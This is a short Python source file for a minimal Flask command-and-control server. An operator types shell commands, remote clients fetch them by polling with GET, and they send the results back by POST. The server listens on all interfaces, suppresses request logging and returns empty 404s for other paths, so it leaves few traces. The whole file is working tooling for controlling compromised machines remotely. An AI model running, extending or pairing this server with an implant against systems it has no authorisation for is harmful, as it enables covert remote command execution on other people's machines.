#!/usr/bin/env python3
__author__ = 'Jon Stratton'
import threading, logging
from flask import Flask, request, redirect

app = Flask(__name__)
log = logging.getLogger('werkzeug') # Turns off Logging
log.setLevel(logging.ERROR)

host = '0.0.0.0'
port = '5000'

class Command:
    def __init__(self):
        self.value = ''
        self._lock = threading.Lock()
    def update(self, new_command):
        with self._lock:
            self.value = new_command

# Loop to get shell commands
def get_command(command):
    while 1:
        new_command = input("")
        command.update(new_command)

@app.errorhandler(404)
def page_not_found(e):
    return '', 404

# GET gets a command, POST returns a result
@app.route("/", methods=['GET', 'POST'])
def new_action():
    returned_command = ''
    if request.method == 'POST' and request.get_data():
        print(request.get_data().decode('utf-8'))
    else:
        returned_command = command.value
        command.update('')
    return returned_command

if __name__ == "__main__":
    command = Command()
    x = threading.Thread(target=get_command, args=(command,))
    x.start()
    app.run(host=host, port=port, debug=False)
